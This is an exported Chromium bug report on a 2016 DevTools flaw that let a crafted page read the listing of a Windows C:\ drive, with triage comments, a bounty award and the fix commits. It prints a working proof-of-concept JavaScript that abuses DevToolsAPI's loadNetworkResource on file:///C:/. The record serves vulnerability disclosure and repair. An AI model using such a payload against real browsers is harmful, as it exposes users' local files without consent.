# Security: chrome-devtools protocol allows to read the content of C:\ drive

| Field | Value |
|-------|-------|
| **Issue ID** | [40085885](https://issues.chromium.org/issues/40085885) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Platform>DevTools |
| **Platforms** | Windows |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ca...@chromium.org |
| **Created** | 2016-11-07 |
| **Bounty** | $3,000.00 |

## Description

**VERSION**  

Chrome Version: 56.0.2912.0  

Operating System: Win7

**REPRODUCTION CASE**

1. Navigate to chrome-devtools://devtools/remote/serve\_rev/@199588/devtools.html
2. Navigate to the link below in chrome-dev.txt (on the same tab)
3. Observe

Demo Attack Script [pre-encoding]:

function f() {c='d="",DevToolsAPI.streamWrite=function(e,o){d+=o},DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///C:/","",0],function(e){d.split("\n").map(function(e){e.match(/addRow.\*;/)&&document.write(e.match(/addRow.\*;/)[0]);})});' ;document.write("<script>window.document.write('<script>'+c+'</scr'+'ipt>');</scr"+"ipt>");}if( typeof DevToolsHost == "undefined" ) location.reload();elsef();

## Attachments

- [chrome-dev.txt](attachments/chrome-dev.txt) (text/plain, 1.7 KB)
- [Recording.mp4](attachments/Recording.mp4) (video/mp4, 838.3 KB)

## Timeline

### el...@chromium.org (2016-11-07)

Looks very similar to 653134; I'm not sure how it differs?

[Monorail components: Platform>DevTools]

### ch...@gmail.com (2016-11-07)

Yeah, but in this report I used the first step to repro.

### es...@chromium.org (2016-11-07)

Does this repro on stable or canary only? (I don't have a windows machine handy to check.)

### ch...@gmail.com (2016-11-07)

I couldn't repro this on 54.0.2840.87 (stable).

### np...@chromium.org (2016-11-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-08)

This issue is a security regression. If you are not able to fix this quickly, please revert the change that introduced it.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-11-08)

[Empty comment from Monorail migration]

### ch...@gmail.com (2016-11-08)

[Comment Deleted]

### ch...@gmail.com (2016-11-15)

Any updates on this bug? thanks.

### sh...@chromium.org (2016-11-21)

dgozman: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ch...@gmail.com (2016-11-30)

Dgozman@ Could you please take a look at this issue? - Thanks :).

### sh...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-05)

dgozman: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2016-12-07)

Impact stable per #8

### ch...@gmail.com (2016-12-19)

This bug seems like has forgotten.

### dg...@chromium.org (2016-12-27)

[Empty comment from Monorail migration]

### ca...@chromium.org (2016-12-28)

Note this is not a recent regression -- I've been able to reproduce this on m55 (stable) as well.

### bu...@chromium.org (2016-12-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/eea3300239f0b53e172a320eb8de59d0bea65f27

commit eea3300239f0b53e172a320eb8de59d0bea65f27
Author: caseq <caseq@chromium.org>
Date: Thu Dec 29 02:19:18 2016

DevTools: move front-end URL handling to DevToolsUIBindingds

BUG=662859

Review-Url: https://codereview.chromium.org/2607833002
Cr-Commit-Position: refs/heads/master@{#440926}

[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/BUILD.gn
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/devtools_ui_bindings.h
[rename] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/devtools_ui_bindings_unittest.cc
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/devtools_window.cc
[add] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/url_constants.cc
[add] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/devtools/url_constants.h
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/browser/ui/webui/devtools_ui.h
[modify] https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27/chrome/test/BUILD.gn


### ch...@gmail.com (2017-01-02)

Verified on 57.0.2969.1 (Canary). Fixed.

### aw...@chromium.org (2017-01-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-05)

Your change meets the bar and is auto-approved for M56. Please go ahead and merge the CL manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), gkihumba@(cros), bustamante@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ca...@chromium.org (2017-01-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-01-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/714ce74842af647ab192124910b08a07ee7d606b

commit 714ce74842af647ab192124910b08a07ee7d606b
Author: caseq <caseq@chromium.org>
Date: Wed Jan 11 01:31:09 2017

Revert of DevTools: move front-end URL handling to DevToolsUIBindingds (patchset #2 id:40001 of https://codereview.chromium.org/2607833002/ )

Reason for revert:
A better fix is coming, reverting this one to make it a part of the new fix so that one CL may be merged onto a branch.

Original issue's description:
> DevTools: move front-end URL handling to DevToolsUIBindingds
>
> BUG=662859
>
> Committed: https://crrev.com/eea3300239f0b53e172a320eb8de59d0bea65f27
> Cr-Commit-Position: refs/heads/master@{#440926}

TBR=dgozman@chromium.org
# Not skipping CQ checks because original CL landed more than 1 days ago.
BUG=662859

Review-Url: https://codereview.chromium.org/2620193002
Cr-Commit-Position: refs/heads/master@{#442758}

[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/devtools/BUILD.gn
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/devtools/devtools_ui_bindings.h
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/devtools/devtools_window.cc
[delete] https://crrev.com/451daad4f60a3ca0f7508097309d11a15da480fe/chrome/browser/devtools/url_constants.cc
[delete] https://crrev.com/451daad4f60a3ca0f7508097309d11a15da480fe/chrome/browser/devtools/url_constants.h
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/ui/webui/devtools_ui.h
[rename] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/browser/ui/webui/devtools_ui_unittest.cc
[modify] https://crrev.com/714ce74842af647ab192124910b08a07ee7d606b/chrome/test/BUILD.gn


### bu...@chromium.org (2017-01-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c2db881506f5709433a5bf6ed981b1bc0c860598

commit c2db881506f5709433a5bf6ed981b1bc0c860598
Author: caseq <caseq@chromium.org>
Date: Wed Jan 11 03:39:32 2017

Fix front-end host creation upon navigation

- when navigating, add host bindings to the pending frame rather than old frame;
- force renderer swap if front-end URL is invalid;
- move front-end URL validation to DevToolsUIBindingds

This also re-lands https://codereview.chromium.org/2607833002

BUG=662859,678035

Review-Url: https://codereview.chromium.org/2620153002
Cr-Commit-Position: refs/heads/master@{#442781}

[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/BUILD.gn
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/devtools_ui_bindings.h
[rename] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/devtools_ui_bindings_unittest.cc
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/devtools_window.cc
[add] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/url_constants.cc
[add] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/devtools/url_constants.h
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/ui/webui/chrome_web_ui_controller_factory.cc
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/browser/ui/webui/devtools_ui.h
[modify] https://crrev.com/c2db881506f5709433a5bf6ed981b1bc0c860598/chrome/test/BUILD.gn


### aw...@chromium.org (2017-01-12)

Greetings!  The panel took a look at this and decided to reward $3,000!  Please note that's only because this bug can be triggered from an untrusted extension. The amount of user interaction required in the bug as reported would have made it unlikely to receive a reward.

### ch...@gmail.com (2017-01-12)

Thanks Andrew! :)

### aw...@chromium.org (2017-01-17)

Hi caseq@ - mind doing the merge to M56?

### aw...@chromium.org (2017-01-17)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-01-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d6f1c251f409263302a2df863df61314418dc4b2

commit d6f1c251f409263302a2df863df61314418dc4b2
Author: Andrey Kosyakov <caseq@chromium.org>
Date: Tue Jan 24 03:21:21 2017

Fix front-end host creation upon navigation

- when navigating, add host bindings to the pending frame rather than old frame;
- force renderer swap if front-end URL is invalid;
- move front-end URL validation to DevToolsUIBindingds

This also re-lands https://codereview.chromium.org/2607833002

BUG=662859,678035

Review-Url: https://codereview.chromium.org/2620153002
Cr-Commit-Position: refs/heads/master@{#442781}
(cherry picked from commit c2db881506f5709433a5bf6ed981b1bc0c860598)

Review-Url: https://codereview.chromium.org/2653783003 .
Cr-Commit-Position: refs/branch-heads/2924@{#853}
Cr-Branched-From: 3a87aecc31cd1ffe751dd72c04e5a96a1fc8108a-refs/heads/master@{#433059}

[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/BUILD.gn
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/devtools_ui_bindings.h
[rename] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/devtools_ui_bindings_unittest.cc
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/devtools_window.cc
[add] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/url_constants.cc
[add] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/devtools/url_constants.h
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/ui/webui/chrome_web_ui_controller_factory.cc
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/browser/ui/webui/devtools_ui.h
[modify] https://crrev.com/d6f1c251f409263302a2df863df61314418dc4b2/chrome/test/BUILD.gn


### aw...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-11-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/484f731aaead5d72c26a21ea012cd2a706146f19

commit 484f731aaead5d72c26a21ea012cd2a706146f19
Author: Andrey Kosyakov <caseq@chromium.org>
Date: Wed Nov 15 18:35:06 2017

DevTools: validate remote front-end URLs

- validate a remote front-end URL before fetching it;
- only expose bindings in window if opener has bindings or there's
    no opener.

Bug: 662859
Change-Id: I3a5619b78dbd29dc730f37d704a212ecad8bbb54
Reviewed-on: https://chromium-review.googlesource.com/770511
Reviewed-by: Dmitry Gozman <dgozman@chromium.org>
Commit-Queue: Andrey Kosyakov <caseq@chromium.org>
Cr-Commit-Position: refs/heads/master@{#516756}
[modify] https://crrev.com/484f731aaead5d72c26a21ea012cd2a706146f19/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/484f731aaead5d72c26a21ea012cd2a706146f19/chrome/browser/devtools/devtools_ui_bindings.h
[modify] https://crrev.com/484f731aaead5d72c26a21ea012cd2a706146f19/chrome/browser/ui/webui/devtools_ui.cc


### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/662859?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085885)*
